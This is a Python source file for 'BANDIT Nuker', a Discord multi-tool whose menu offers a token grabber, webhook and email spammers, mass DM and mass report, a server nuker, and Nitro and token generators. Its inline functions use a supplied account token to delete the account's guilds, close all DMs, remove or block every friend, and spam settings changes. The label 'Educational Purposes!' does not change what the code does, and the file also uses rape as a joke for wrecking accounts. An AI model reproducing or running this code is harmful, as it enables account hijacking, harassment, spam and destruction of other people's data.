import random
import string
import time
import pathlib
import pyperclip
import sys
import pyfiglet
import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path
import colorama
from colorama import Fore, init, Back, Style
from datetime import date
from random import randint
import multiprocessing
import keyboard
import base64


os.system("title     BANDIT Nuker     $     Marcc#6666")

m = Fore.MAGENTA
r = Fore.RESET
g = Fore.GREEN

def Spinner():
        l = (f'10% {Fore.GREEN}███{Fore.RESET}███████████████████████',f'20% {Fore.GREEN}█████{Fore.RESET}█████████████████████',f'25% {Fore.GREEN}█████████{Fore.RESET}██████████████',f'50% {Fore.GREEN}██████████████{Fore.RESET}█████████',f'75% {Fore.GREEN}██████████████████{Fore.RESET}█████████',f'100% {Fore.GREEN}███████████████████████')

	
    
    
    
        for i in l:
            sys.stdout.write(f"""\rStarting BANDIT Nuker     |     {i}""")
            sys.stdout.flush()
            time.sleep(0.4)

Spinner()

os.system("cls")


banner = (f'''
                            ██████╗  █████╗ ███╗   ██╗██████╗ ██╗████████╗             {Fore.RED}C{Fore.GREEN}r{Fore.RED}e{Fore.GREEN}a{Fore.GREEN}t{Fore.RED}o{Fore.GREEN}r{Fore.RED}:   {Fore.RESET}Marcc#6666
                            ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██║╚══██╔══╝             {Fore.RED}G{Fore.GREEN}i{Fore.RED}t{Fore.GREEN}h{Fore.GREEN}u{Fore.RED}b{Fore.GREEN}:    {Fore.RESET}github.com/Futmarcc
                            ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║   
                            ██╔══██╗██╔══██║██║╚██╗██║██║  ██║██║   ██║   
                            ██████╔╝██║  ██║██║ ╚████║██████╔╝██║   ██║   
                            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝                                                                                                            '''.replace('█', f'{Fore.RED}█{Fore.GREEN}') + f'''                                       

{Fore.RED}[{Fore.RED}!{Fore.RED}]{Fore.RED} Educational Purposes!
{Fore.RED}[{Fore.RED}!{Fore.RED}]{Fore.RED} Update & Bug fixes soon!
{Fore.RED}[{Fore.RED}!{Fore.RED}]{Fore.RED} DM Marcc#6666 if u found any bugs!

{Fore.RED}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RED}[{Fore.GREEN}1{Fore.RED}]{Fore.RESET}  Token Login                             {Fore.RED}[{Fore.GREEN}11{Fore.RED}]{Fore.RESET} Mass DM                           {Fore.RED}[{Fore.GREEN}21{Fore.RED}]{Fore.RESET} Remove all Friends
{Fore.RED}[{Fore.GREEN}2{Fore.RED}]{Fore.RESET}  Token Checker                           {Fore.RED}[{Fore.GREEN}12{Fore.RED}]{Fore.RESET} Mass Report                       {Fore.RED}[{Fore.GREEN}22{Fore.RED}]{Fore.RESET} Block all Friends
{Fore.RED}[{Fore.GREEN}3{Fore.RED}]{Fore.RESET}  Token Grabber                           {Fore.RED}[{Fore.GREEN}13{Fore.RED}]{Fore.RESET} Nickname Changer                  {Fore.RED}[{Fore.GREEN}23{Fore.RED}]{Fore.RESET} Cycle Token Status
{Fore.RED}[{Fore.GREEN}4{Fore.RED}]{Fore.RESET}  Token Infos                             {Fore.RED}[{Fore.GREEN}14{Fore.RED}]{Fore.RESET} Token Generator                   {Fore.RED}[{Fore.GREEN}24{Fore.RED}]{Fore.RESET} Rape Token 
{Fore.RED}[{Fore.GREEN}5{Fore.RED}]{Fore.RESET}  Webhook Infos                           {Fore.RED}[{Fore.GREEN}15{Fore.RED}]{Fore.RESET} Nitro Generator                   {Fore.RED}[{Fore.GREEN}25{Fore.RED}]{Fore.RESET} Token Country
{Fore.RED}[{Fore.GREEN}6{Fore.RED}]{Fore.RESET}  Webhook Spammer                         {Fore.RED}[{Fore.GREEN}16{Fore.RED}]{Fore.RESET} IP Pinger                         {Fore.RED}[{Fore.GREEN}26{Fore.RED}]{Fore.RESET} Server Nuker
{Fore.RED}[{Fore.GREEN}7{Fore.RED}]{Fore.RESET}  Webhook Multi Spammer                   {Fore.RED}[{Fore.GREEN}17{Fore.RED}]{Fore.RESET} Website Pinger                    {Fore.RED}[{Fore.GREEN}27{Fore.RED}]{Fore.GREEN} About
{Fore.RED}[{Fore.GREEN}8{Fore.RED}]{Fore.RESET}  Webhook Deleter                         {Fore.RED}[{Fore.GREEN}18{Fore.RED}]{Fore.RESET} Token Email Spammer               {Fore.RED}[{Fore.GREEN}28{Fore.RED}]{Fore.RED} Exit
{Fore.RED}[{Fore.GREEN}9{Fore.RED}]{Fore.RESET}  Server Joiner                           {Fore.RED}[{Fore.GREEN}19{Fore.RED}]{Fore.RESET} Token Guild's
{Fore.RED}[{Fore.GREEN}10{Fore.RED}]{Fore.RESET} Mass Leaver                             {Fore.RED}[{Fore.GREEN}20{Fore.RED}]{Fore.RESET} Close all DM's                             
{Fore.GREEN}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')


os.system("cls")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))

choose = input(f"""

{banner}
{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.GREEN}{Fore.RESET} Option: """)

if choose=='1':
    path = ("util\other")
    os.chdir(path)
    os.system("python tokenlogin.py")















if choose=='2':
    path = ("util\!_tokenchecker")
    os.chdir(path)
    os.system("python tokenchecker.py")
    bandit = ("Bandit Multi Tool")
    os.chdir(path)










def get_token_information(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    token_info_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me", headers=headers
    ).json()
    for key in token_info_request:
        print(f"{Fore.GREEN}{key}: {Fore.RED}{token_info_request[f'{key}']}")
    time.sleep(5)

if choose=='4':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Token: ")
    path = ("util/other")
    os.chdir(path)
    get_token_information(Token)










if choose=='5':
    path = ("util\other")
    os.chdir(path)
    os.system(f"python webhookinfo.py")









if choose=='6':
    path = ("util\other")
    os.chdir(path)
    os.system("python webhookspammer.py")











if choose=='7':
    path = ("util\!_multi_webhook_spammer")
    os.chdir(path)
    os.system("python hookmultispammer.py")









if choose=='8':
    path = ("util\other")
    os.chdir(path)
    os.system("python webhookdeleter.py")








if choose=='9':
    path = ("util\!_joiner")
    os.chdir(path)
    os.system("python joiner.py")






if choose=='10':
    path = ("util\other")
    os.chdir(path)
    os.system("python leaver.py")






if choose=='11':
    path = ("util\other")
    os.chdir(path)
    os.system("python massdm.py")






if choose=='12':
    path = ("util\other")
    os.chdir(path)
    os.system("python massreport.py")










if choose=='13':
    path = ("util\other")
    os.chdir(path)
    os.system("python namechanger.py")




















if choose=='26':
    path = ("util\other")
    os.chdir(path)
    os.system("python servernuker.py")










if choose=='15':
    path = ("util\!_nitrogen&codes")
    os.chdir(path)
    os.system("python nitrogen.py")



















if choose=='16':
    os.startfile(os.getcwd() + '/util/tools/1/ippinger.bat')
if choose=='17':
    os.startfile(os.getcwd() + '/util/tools/2/webpinger.bat')












if choose=='18':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.GREEN}{Fore.RESET} Discord Token: ")
    path = "util/other"
    os.chdir(path)
    os.system(f"py emailspammer.py {Token}")


def delete_personal_guilds(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    print(f"{Fore.RED}[{Fore.GREEN}!{Fore.RED}]{Fore.GREEN}{Fore.RESET} Got Data")
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
        print(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.GREEN}{Fore.RESET}" + i["id"])


if choose=='19':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.GREEN}{Fore.RESET} Discord Token: ")
    delete_personal_guilds(Token)



def close_all_dms(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )

if choose=='20':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Token: ")
    close_all_dms(Token)

def remove_all_token_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
        )
        print(f"{Fore.RED}[{Fore.GREEN}!{Fore.RED}]{Fore.RESET} Removed Friend: {i['id']}")

if choose=='21':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Token: ")
    remove_all_token_friends(Token)





def block_all_token_friends(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"{Fore.RED}[{Fore.GREEN}!{Fore.RED}]{Fore.RESET} Blocked Friend: {i['id']}")

if choose=='22':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Token: ")
    block_all_token_friends(Token)












def cycle_token_status(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    for i in range(0, 50):
        json = {"custom_status": {"text": f"{text3}"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": f"{text1}"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": f"{text2}"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
    time.sleep(0.7)

if choose=='23':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Token: ")
    text1 = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Text: ")
    text2 = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Text 2: ")
    text3 = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Text 3: ")
    cycle_token_status(Token)











def spam_token_settings(Token):
	print(f'{Fore.RED}[{Fore.GREEN}!{Fore.RED}]{Fore.RESET} Accoung getting raped right now!')
	for i in range(0, 100):
		headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
		condition_status = True
		payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
		condition_status = False
		payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)

if choose=='24':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Token: ")
    spam_token_settings(Token)






def get_token_country(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    token_country_request = requests.get(
        "https://discord.com/api/v8/auth/location-metadata", headers=headers
    ).json()
    print(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Token Country: {token_country_request['country_code']}")

if choose=='25':
    Token = input(f"{Fore.RED}[{Fore.GREEN}-->{Fore.RED}]{Fore.RESET} Discord Token: ")
    get_token_country(Token)


















if choose=='14':
    path = "util/!_token_gen" 
    os.chdir(path)
    os.system("py token_gen.py")




if choose=='3':
    path = "BanditFiles"
    os.chdir(path)
    os.system("py grabber_builder.py")


if choose=='27':
    os.system("cls")
    print(f''' 
            █████╗ ██████╗  ██████╗ ██╗   ██╗████████╗
           ██╔══██╗██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝
           ███████║██████╔╝██║   ██║██║   ██║   ██║   
           ██╔══██║██╔══██╗██║   ██║██║   ██║   ██║   
           ██║  ██║██████╔╝╚██████╔╝╚██████╔╝   ██║   
           ╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝    ╚═╝   
                Marcc#6666  |  github.com/Futmarcc                                
    
The "BANDIT Nuker" and the associated "Tools" were created by {Fore.MAGENTA}Marcc#6666{Fore.RESET} the tools are available for free so we ask you not to skid it!
If you find any errors/bugs please write {Fore.MAGENTA}Marcc#6666{Fore.RESET} so he can fix it!
And if you like the multi tool don't forget to leave a star on github.com/Futmarcc
    
    
    
    
    '''.replace('█', f'{Fore.MAGENTA}█{Fore.WHITE}'))
    time.sleep(50)




if choose=='28':
    os.system("cls")
    print(f''' 
                     ██████╗ ██╗   ██╗███████╗██╗
                     ██╔══██╗╚██╗ ██╔╝██╔════╝██║
                     ██████╔╝ ╚████╔╝ █████╗  ██║
                     ██╔══██╗  ╚██╔╝  ██╔══╝  ╚═╝
                     ██████╔╝   ██║   ███████╗██╗
                     ╚═════╝    ╚═╝   ╚══════╝╚═╝
                            
                Marcc#6666  |  github.com/Futmarcc                                
    
{Fore.GREEN}Goodbye! Thanks for using BANDIT Nuker!
    
    
    
    
    '''.replace('█', f'{Fore.WHITE}█{Fore.RED}'))
time.sleep(3)